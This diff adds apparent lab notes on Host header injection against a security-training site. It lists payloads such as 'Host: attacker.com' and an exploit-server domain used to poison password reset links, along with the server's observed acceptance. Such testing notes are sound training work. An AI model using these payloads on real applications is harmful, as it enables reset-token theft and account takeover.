@@ -1,0 +1,31 @@
+# Host Header Injection Payloads
+
+## Payload 1
+
+Host: attacker.com
+
+Purpose:
+Test whether the application accepts arbitrary Host header values.
+
+Observed Behavior:
+Application processed password reset request successfully.
+
+## Payload 2
+
+Host: exploit-0a5e009403844d5b8081202f01b6005a.exploit-server.net
+
+Purpose:
+Test password reset poisoning using attacker-controlled exploit server domain.
+
+Observed Behavior:
+Server accepted manipulated Host header and continued processing request.
+
+## Original Valid Host
+
+Host: 0a8000d903ff4d7f80cc21d5001f0041.web-security-academy.net
+
+Purpose:
+Baseline comparison request.
+
+Observed Behavior:
+Normal password reset functionality.
